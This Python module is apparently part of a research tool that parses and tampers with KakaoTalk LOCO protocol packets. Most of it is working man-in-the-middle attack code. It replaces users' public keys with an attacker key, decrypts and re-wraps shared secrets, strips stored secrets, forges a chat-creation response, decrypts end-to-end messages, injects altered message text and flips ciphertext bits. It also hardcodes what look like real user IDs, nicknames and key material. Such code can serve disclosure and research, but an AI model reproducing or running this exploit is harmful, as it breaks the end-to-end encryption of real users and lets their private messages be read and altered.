import base64
import io
import logging
import re
import struct

import bson

from .crypto_utils import (aes_decrypt, aes_e2e_decrypt, aes_encrypt,
                           compute_key, compute_nonce, get_rsa_public_key_pem,
                           rsa_decrypt, rsa_encrypt)


class LocoPacket:
    def __init__(
        self,
        id=0,
        status_code=0,
        loco_command="",
        body_type=0,
        body_length=0,
        body_payload=b"",
    ):
        self.id = id
        self.status_code = status_code
        self.loco_command = loco_command
        self.body_type = body_type
        self.body_length = body_length
        self.body_payload = body_payload

    def get_packet_bytes(self) -> bytes:
        try:
            f = io.BytesIO()
            f.write(struct.pack("<I", self.id))
            f.write(struct.pack("<H", self.status_code))
            f.write(self.loco_command.encode("utf-8"))
            f.write(b"\x00" * (11 - len(self.loco_command)))
            f.write(struct.pack("<b", self.body_type))
            f.write(struct.pack("<i", self.body_length))
            f.write(self.body_payload)
            return f.getvalue()
        except Exception as general_exception:
            logging.error("Could not create LOCO packet: %s", general_exception)
            return None

    def get_packet_as_dict(self) -> dict:
        loco_dict = vars(self)

        try:
            if loco_dict["body_payload"] and isinstance(
                loco_dict["body_payload"], bytes
            ):
                loco_dict["body_payload"] = bson.loads(self.body_payload)
            elif loco_dict["body_payload"] and isinstance(
                loco_dict["body_payload"], dict
            ):
                loco_dict["body_payload"] = self.body_payload
        except Exception as general_exception:
            logging.error(
                "Could not decode BSON body of packet %s: %s",
                self.loco_command,
                general_exception,
            )

        return loco_dict


class LocoEncryptedPacket:
    def __init__(self, length=0, iv=b"", payload=b""):
        self.length = length
        self.iv = iv
        self.payload = payload

    def create_new_packet(self, loco_packet: LocoPacket) -> bytes:
        # new_iv = os.urandom(16)

        if not loco_packet:
            logging.error(
                "Could not create LOCO encrypted packet: Loco packet data is None."
            )
            return None

        encrypted_packet = aes_encrypt(loco_packet.get_packet_bytes(), self.iv)

        if not encrypted_packet:
            logging.error("Could not encrypt LOCO packet.")
            return None

        try:
            f = io.BytesIO()
            f.write(struct.pack("<I", len(encrypted_packet) + len(self.iv)))
            f.write(self.iv)
            f.write(encrypted_packet)
            return f.getvalue()
        except Exception as general_exception:
            logging.error(
                "Could not create LOCO encrypted packet: %s", general_exception
            )
            return None

    def get_packet_bytes(self) -> bytes:
        try:
            f = io.BytesIO()
            f.write(struct.pack("<I", len(self.payload) + len(self.iv)))
            f.write(self.iv)
            f.write(self.payload)
            return f.getvalue()
        except Exception as general_exception:
            logging.error(
                "Could not convert LOCO encrypted packet to bytes: %s",
                general_exception,
            )
            return None


class LocoHandshakePacket:
    def __init__(self, length=256, type=0, block_cipher_mode=0, payload=b""):
        self.length = length
        self.type = type
        self.block_cipher_mode = block_cipher_mode
        self.payload = payload

        self.cipher_mode_map = {1: "CBC", 2: "AES/CFB/NoPadding", 3: "OFB"}
        self.encryption_mode_map = {15: "RSA/NONE/OAEPWithSHA1AndMGF1Padding"}


class LocoParser:
    def __init__(self):
        self.loco_packet = LocoPacket()
        self.loco_encrypted_packet = LocoEncryptedPacket()
        self.handshake_packet = LocoHandshakePacket()

    def parse_loco_packet(self, data):
        if not data:
            logging.error("Could not parse LOCO encrypted packet: Packet data is None.")
            return None

        try:
            id = struct.unpack("<I", data[:4])[0]
            status_code = struct.unpack("<H", data[4:6])[0]
            loco_command = data[6:17].decode().replace("\0", "")
            body_type = struct.unpack("<b", data[17:18])[0]
            body_length = struct.unpack("<i", data[18:22])[0]
            body_payload = data[22:]
            return LocoPacket(
                id, status_code, loco_command, body_type, body_length, body_payload
            )
        except Exception as general_exception:
            logging.error(
                "Could not parse LOCO packet: %s \nAre you running Frida to patch the AES key?",
                general_exception,
            )
            return None

    def parse_loco_encrypted_packet(self, data):
        if not data:
            logging.error("Could not parse LOCO encrypted packet: Packet data is None.")
            return None

        try:
            length = struct.unpack("<I", data[0:4])[0]
            iv = data[4:20]
            payload = data[20:]
            return LocoEncryptedPacket(length, iv, payload)
        except Exception as general_exception:
            logging.error(
                "Could not parse LOCO encrypted packet: %s", general_exception
            )
            return None

    def parse_handshake_packet(self, data):
        if not data:
            logging.error("Could not parse LOCO handshake packet: Packet data is None.")
            return None

        try:
            type = struct.unpack("<I", data[4:8])[0]
            block_cipher_mode = struct.unpack("<I", data[8:12])[0]
            payload = data[22:]
            return LocoHandshakePacket(type, block_cipher_mode, payload)
        except Exception as general_exception:
            logging.error(
                "Could not parse LOCO handshake packet: %s", general_exception
            )
            return None

    def parse(self, data):
        self.loco_encrypted_packet = self.parse_loco_encrypted_packet(data)

        if self.loco_encrypted_packet.length == 256:
            self.handshake_packet = self.parse_handshake_packet(data)
        else:
            decrypted_payload = aes_decrypt(
                self.loco_encrypted_packet.payload, self.loco_encrypted_packet.iv
            )
            self.loco_packet = self.parse_loco_packet(decrypted_payload)

    def inject_message(self, trigger_message, payload) -> bytes:
        if not self.loco_packet:
            return None

        if not self.loco_packet.loco_command in ["MSG", "LOGINLIST"]:
            return None

        body_json = self.loco_packet.body_payload

        if (
            "chatLog" in body_json
            and body_json["chatLog"]["message"] == trigger_message
        ):
            body_json["chatLog"]["message"] = payload

        if "chatDatas" in body_json and body_json["chatDatas"]:
            if (
                "l" in body_json["chatDatas"][0]
                and "message" in body_json["chatDatas"][0]["l"]
                and body_json["chatDatas"][0]["l"]["message"] == trigger_message
            ):
                body_json["chatDatas"][0]["l"]["message"] = payload

        self.loco_packet.body_payload = self.bson_encode(body_json)
        self.loco_packet.body_length = len(self.loco_packet.body_payload)
        return self.loco_encrypted_packet.create_new_packet(self.loco_packet)

    def _xor(self, param1, param2):
        return bytes((x ^ y) for (x, y) in zip(param1, param2))

    def flip_bits(self):
        if not self.loco_packet.loco_command == "MSG":
            return None

        if self.loco_packet.body_length != 221:
            logging.error(f"I'm NOT here: {self.loco_packet.body_length}")
            return None
        else:
            logging.error("I'm here!")

        # Patch size
        # body = bytearray(self.loco_packet.body_payload)
        # body[128:129] = b"\x0F"
        # self.loco_packet.body_payload = bytes(body)
        # loco_encrypted = aes_encrypt(self.loco_packet.get_packet_bytes(), self.loco_encrypted_packet.iv)
        loco_encrypted = self.loco_encrypted_packet.payload

        ciphertext = bytearray(loco_encrypted)
        p11 = b"AAAAAAAAAAAAAAAA"
        c11 = ciphertext[0xA0 : 0xA0 + 0x10]
        x = self._xor(c11, p11)
        c11_new = self._xor(x, b"BBBBBBBB\x00\x05\x00\x11\x00\x00\x00\x00")
        ciphertext[0xA0 : 0xA0 + 0x10] = c11_new
        self.loco_encrypted_packet.payload = bytes(ciphertext)
        return self.loco_encrypted_packet.get_packet_bytes()

    def get_clean_public_key(self, key_pair) -> str:
        mitm_public_key_pem = get_rsa_public_key_pem(key_pair).decode("utf-8")
        header = "-----BEGIN PUBLIC KEY-----"
        footer = "-----END PUBLIC KEY-----"
        pattern = re.compile(
            f"{header}|{footer}",
            re.MULTILINE,
        )
        mitm_public_key_cleaned = pattern.sub("", mitm_public_key_pem).replace("\n", "")

        return mitm_public_key_cleaned

    def inject_public_key(self, key_pair):
        if not self.loco_packet:
            logging.error("LOCO packet data is None.")
            return (None, None, None)

        if isinstance(self.loco_packet.body_payload, bytes):
            self.loco_packet.body_payload = self.bson_decode(
                self.loco_packet.body_payload
            )

        if not self.loco_packet.loco_command in {
            "GETPK",
            "GETLPK",
            "SCREATE",
            "CHATONROOM",
        }:
            return (None, None, None)

        if not self.loco_packet.body_payload.get("pi"):
            logging.error(
                "LOCO packet %s doesn't contain dictionary key 'pi'.",
                self.loco_packet.loco_command,
            )
            return (None, None, None)

        mitm_public_key_cleaned = self.get_clean_public_key(key_pair)

        logging.info("MITM public key: %s", mitm_public_key_cleaned)

        original_public_key = self.loco_packet.body_payload["pi"][0]["ek"]
        user_id = self.loco_packet.body_payload["pi"][0]["u"]
        self.loco_packet.body_payload["pi"][0]["ek"] = mitm_public_key_cleaned

        if not len(original_public_key) == len(mitm_public_key_cleaned):
            logging.error("Original and MITM public key don't have the same length!")
            return (None, None, None)

        self.loco_packet.body_payload = self.bson_encode(self.loco_packet.body_payload)
        self.loco_packet.body_length = len(self.loco_packet.body_payload)

        return (
            original_public_key.encode(),
            user_id,
            self.loco_encrypted_packet.create_new_packet(self.loco_packet),
        )

    def remove_stored_shared_secret(self, recipient_user_id):
        if not self.loco_packet:
            return None

        if isinstance(self.loco_packet.body_payload, bytes):
            logging.error("Could not parse LOCO packet body.")
            return None

        if self.loco_packet.loco_command not in {"SCREATE", "CHATONROOM"}:
            return None

        if (
            self.loco_packet.loco_command == "SCREATE"
            and self.loco_packet.body_payload.get("status") != 0
        ):
            logging.info("Replacing SCREATE body...")
            screate_body = {
                "status": 0,
                "c": 9388354540351878,
                "r": {
                    "chatId": 9388354540351878,
                    "members": [
                        {
                            "userId": 405368740,
                            "accountId": 262855419,
                            "nickName": "furztrocken",
                            "countryIso": "DE",
                            "profileImageUrl": "",
                            "fullProfileImageUrl": "",
                            "originalProfileImageUrl": "",
                            "statusMessage": "",
                            "linkedServices": "",
                            "type": -999999,
                            "suspended": False,
                        },
                        {
                            "userId": recipient_user_id,
                            "accountId": 256190398,
                            "nickName": "peterplan",
                            "countryIso": "DE",
                            "profileImageUrl": "",
                            "fullProfileImageUrl": "",
                            "originalProfileImageUrl": "",
                            "statusMessage": "",
                            "linkedServices": "",
                            "type": -999999,
                            "suspended": False,
                        },
                    ],
                    "activeMemberIds": [405368740, recipient_user_id],
                    "watermarks": [3122424091315798016, 3122424091315798016],
                    "lastMessage": None,
                    "lastUpdatedAt": None,
                    "lastLogId": 0,
                    "newMessageCount": -1,
                    "type": "SDirectChat",
                    "pushAlert": None,
                    "metaRevisions": None,
                    "o": 1693159158,
                    "pct": None,
                },
                "sc": 3122424099724080067,
                "pi": [
                    {
                        "u": recipient_user_id,
                        "ek": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyfkeppzP/qOIUXRqzHt+KjE/sz5tMCwf3Y7Xz+SoDU2kYVTjZS1NWtNMT4gFhiVVsX+uwdwEU0ijgg07zX9GM45HZJoj+Wrb58pNHBUqfksR/oXcX5jBASDh3Oks7Naw2FLdtFdqh1uISzYKA7Ubo0C8ep4N7PVYJdJvsa83nFYbfVi7WTCZJqixla4of+yVaj+XNq/+n8hew8pJEW2hx1szJjqfZSskTTUwASiWBTSdHktnv6y7N8Ls32buAfZu+Oqzw5DRJrWL8iLLx9hkM1T5dPTrc2RcabuG/YiamPaVN9P1iGz2HM9b0fUBFvH8e8REaujlOQVr3cyl/rezdQIDAQAB",
                        "sk": "odgQ7ds/Pz9AlC7kNSVCLFHZAvRCMUVPzc3R3FZlqAI=",
                        "pt": 3122418946040168677,
                        "cs": "",
                    }
                ],
                "nc": True,
            }
            self.loco_packet.body_payload = screate_body

        """
        if self.loco_packet.body_payload.get("pi"):
            logging.info("Removing public key from %s packet.", self.loco_packet.loco_command)
            self.loco_packet.body_payload.pop("pi")
        """

        if self.loco_packet.body_payload.get("si"):
            logging.info(
                "Removing stored shared secret from %s packet.",
                self.loco_packet.loco_command,
            )
            self.loco_packet.body_payload.pop("si")

        self.loco_packet.body_payload = self.bson_encode(self.loco_packet.body_payload)
        self.loco_packet.body_length = len(self.loco_packet.body_payload)

        return self.loco_encrypted_packet.create_new_packet(self.loco_packet)

    def get_e2e_encryption_key(self, shared_secret: bytes):
        salt = b"53656372657443686174526f6f6d4b6579"
        return compute_key(shared_secret, salt, 32)

    def get_shared_secret(self, rsa_key_pair) -> bytes:
        shared_secret = None

        if not self.loco_packet:
            return None

        if isinstance(self.loco_packet.body_payload, bytes):
            logging.error("Could not parse LOCO packet body.")
            return None

        if self.loco_packet.loco_command != "SETSK":
            return None

        if not self.loco_packet.body_payload.get("sk"):
            logging.error("No shared secret in SETSK packet.")
            return None

        if len(self.loco_packet.body_payload.get("sk")) != 2:
            logging.error("Only one encrypted shared secret in 'sk' list.")
            return None

        encrypted_shared_secret = base64.b64decode(
            self.loco_packet.body_payload["sk"][0]
        )

        try:
            shared_secret = rsa_decrypt(encrypted_shared_secret, rsa_key_pair)
        except ValueError as value_error:
            logging.exception(value_error)
            return None

        return base64.b64encode(shared_secret)

    def encrypt_shared_secret(self, shared_secret: bytes, public_key: bytes):
        if not self.loco_packet:
            return None

        if isinstance(self.loco_packet.body_payload, bytes):
            logging.error("Could not parse LOCO packet body.")
            return None

        if self.loco_packet.loco_command != "SETSK":
            return None

        shared_secret = base64.b64encode(
            rsa_encrypt(shared_secret, public_key.decode("utf-8"), True)
        )
        self.loco_packet.body_payload["sk"][0] = shared_secret

        self.loco_packet.body_payload = self.bson_encode(self.loco_packet.body_payload)
        self.loco_packet.body_length = len(self.loco_packet.body_payload)

        return self.loco_encrypted_packet.create_new_packet(self.loco_packet)

    def get_decrypted_e2e_message(self, e2e_encryption_key, shared_secret):
        if not self.loco_packet:
            return None

        if not self.loco_packet.loco_command in {"SWRITE", "MSG"}:
            return None

        if not self.loco_packet.body_payload:
            return None

        # Get sender's E2E message
        if self.loco_packet.loco_command == "SWRITE" and isinstance(
            self.loco_packet.body_payload.get("m"), (bytes, str)
        ):
            secret_message = base64.b64decode(self.loco_packet.body_payload["m"])
            msg_id = self.loco_packet.body_payload["mid"]
            # chat_id = self.loco_packet.body_payload["c"]

        # Get receiver's E2E message
        if (
            self.loco_packet.loco_command == "MSG"
            and self.loco_packet.body_payload.get("chatLog")
        ):
            secret_message = base64.b64decode(
                self.loco_packet.body_payload["chatLog"]["message"]
            )
            msg_id = self.loco_packet.body_payload["chatLog"]["msgId"]
            # chat_id = self.loco_packet.body_payload["chatId"]

        nonce = compute_nonce(shared_secret, msg_id)

        logging.info("Nonce: %s", base64.b64encode(nonce))

        return aes_e2e_decrypt(secret_message, e2e_encryption_key, nonce)

    def bson_encode(self, data):
        return bson.dumps(data)

    def bson_decode(self, data):
        return bson.loads(data)
